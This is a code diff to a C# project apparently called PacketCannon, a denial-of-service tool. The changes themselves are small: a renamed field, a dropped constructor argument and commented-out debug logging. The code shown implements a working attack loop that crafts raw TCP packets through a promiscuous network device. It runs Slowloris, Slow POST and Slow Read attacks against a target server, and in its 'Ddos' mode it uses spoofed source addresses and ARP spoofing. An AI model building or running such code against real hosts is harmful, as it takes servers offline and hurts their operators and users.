@@ -20,7 +20,7 @@ namespace PacketCannon
 {
     public class DosController
     {
-        public ConcurrentBag<DosSender> dosSenders;
+        public ConcurrentBag<DosSender> DosSenders;
 
         public string SourceIpv4;
         public string DestinationIpV4 { get; set; }
@@ -88,50 +88,50 @@ namespace PacketCannon
 
             if (Ddos)
             {
-                var tester = new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress,
+                var tester = new DosSender(SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress,
                     SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader,
                     SlowReadUrl, SourcePort, PortStep);
                 ArpSpoofAddress(DdosCount, tester);
             }
 
-            dosSenders = new ConcurrentBag<DosSender>();
+            DosSenders = new ConcurrentBag<DosSender>();
 
             for (int i = 0; i < SenderSize; i++)
             {
-                dosSenders.Add(new DosSender(SelectedDevice, SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
+                DosSenders.Add(new DosSender(SourceIpv4, DestinationIpV4, DestinationMac, SourceMac, HostAddress, SlowLorisKeepAliveData, SlowLorisHeader, SlowPostContentLength, SlowPostHeader, SlowReadUrl, SourcePort, PortStep, Ddos));
             }
 
-            foreach (var dosSender in dosSenders)
+            foreach (var dosSender in DosSenders)
             {
                 Console.WriteLine(dosSender.SourceIpV4.ToString());
             }
 
             if (_attackMode == Attacks.SlowRead)
             {
-                foreach (var dosSender in dosSenders)
+                foreach (var dosSender in DosSenders)
                 {
                     dosSender.WindowSize = (ushort)SlowReadWindowSize;
                 }
             }
-            Random rand = new Random();
-            var path = $@"C:\Users\Mystify_PC\source\repos\WpfApp2\test{rand.Next()}.txt";
-            var a = File.Create(path);
-            a.Close();
+            //Random rand = new Random();
+            //var path = $@"C:\Users\Mystify_PC\source\repos\WpfApp2\test{rand.Next()}.txt";
+            //var a = File.Create(path);
+            //a.Close();
             var watcher = new Thread(SearchForPackets);
             watcher.Start();
             using (Communicator = SelectedDevice.Open(65536, PacketDeviceOpenAttributes.Promiscuous, 100))
             {
                 while (true)
                 {
-                    var logs = "";
-                    foreach (var dosSender in dosSenders)
+                    //var logs = "";
+                    foreach (var dosSender in DosSenders)
                     {
                         switch (dosSender.Status)
                         {
                             case SenderStat.SendSyn:
                                 dosSender.SendSyn(Communicator);
                                 dosSender.Status = SenderStat.WaitingForAck;
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)}-- SendingSyn";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)}-- SendingSyn";
                                 break;
 
                             case SenderStat.RecievingSlowRead:
@@ -153,18 +153,18 @@ namespace PacketCannon
                                 dosSender.Waited++;
                                 break;
 
-                            //SLOW-LORIS
+                            //SLOWLORIS
                             case SenderStat.SendingAck when _attackMode == Attacks.SlowLoris:
                                 dosSender.SendAck(Communicator);
                                 dosSender.Status = SenderStat.SendingSlowLorisGetHeader;
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SendingLorisHeader";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SendingLorisHeader";
                                 break;
 
                             //SLOW-POST
                             case SenderStat.SendingAck when _attackMode == Attacks.SlowPost:
                                 dosSender.SendAck(Communicator);
                                 dosSender.Status = SenderStat.SedingSlowPostHeader;
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostHeader";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostHeader";
 
                                 break;
 
@@ -173,22 +173,22 @@ namespace PacketCannon
                                 dosSender.SendAck(Communicator);
                                 dosSender.Status = SenderStat.SedingGetForSlowRead;
 
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadGet";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadGet";
                                 break;
 
-                            //SLOW-LORIS
+                            //SLOWLORIS
                             case SenderStat.SendingSlowLorisGetHeader:
                                 dosSender.SendGetNotComplete(Communicator);
                                 dosSender.Status = SenderStat.SendingKeepAliveForSlowLoris;
 
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisGetHeader";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisGetHeader";
                                 break;
 
-                            //SLOW-LORIS
+                            //SLOWLORIS
                             case SenderStat.SendingKeepAliveForSlowLoris:
                                 dosSender.SendSlowLorisKeepAlive(Communicator);
 
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisKeepAlive";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowlorisKeepAlive";
                                 break;
 
                             //SLOW-POST
@@ -196,14 +196,14 @@ namespace PacketCannon
                                 dosSender.SendSlowPostHeader(Communicator);
                                 dosSender.Status = SenderStat.SedingKeepAliveForSlowPost;
 
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostHeader";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostHeader";
                                 break;
 
                             //SLOW-POST
                             case SenderStat.SedingKeepAliveForSlowPost:
                                 dosSender.SendSlowPostKeepAlive(Communicator);
 
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostKeepAlive";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowPostKeepAlive";
                                 break;
 
                             //SLOW-READ
@@ -211,7 +211,7 @@ namespace PacketCannon
                                 dosSender.WindowSize = (ushort)SlowReadWindowSize;
                                 dosSender.SendSlowReadCompleteGet(Communicator);
                                 dosSender.Status = SenderStat.RecievingSlowRead;
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadGet";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadGet";
                                 break;
 
                             //SLOW-READ
@@ -219,7 +219,7 @@ namespace PacketCannon
                                 dosSender.Status = SenderStat.RecievingSlowRead;
                                 dosSender.SendAck(Communicator);
 
-                                logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadKeepAlive";
+                                //logs += $"{Environment.NewLine}{dosSender.SourcePort} -- {DateTime.UtcNow.ToString("mm:ss.fff", CultureInfo.InvariantCulture)} -- SlowReadKeepAlive";
                                 break;
 
                             default:
@@ -228,10 +228,10 @@ namespace PacketCannon
                         Thread.Sleep(SenderTimeOut == 0 ? new Random().Next(5, 20) : SenderTimeOut);
                     }
                     Thread.Sleep(SenderWaveTimeOut == 0 ? new Random().Next(1000, 5000) : SenderWaveTimeOut);
-                    using (StreamWriter sw = File.AppendText(path))
-                    {
-                        sw.Write(logs);
-                    }
+                    //using (StreamWriter sw = File.AppendText(path))
+                    //{
+                    //    sw.Write(logs);
+                    //}
                 }
             }
         }
@@ -248,8 +248,8 @@ namespace PacketCannon
                         DosSender a;
                         try
                         {
-                            a = Ddos ? dosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort && FakeIpV4Addresses.Contains(packet.Ethernet.IpV4.Destination))
-                             : dosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort);
+                            a = Ddos ? DosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort && FakeIpV4Addresses.Contains(packet.Ethernet.IpV4.Destination))
+                             : DosSenders.First(x => x.SourcePort == packet.Ethernet.IpV4.Tcp.DestinationPort);
                         }
                         catch (Exception)
                         {
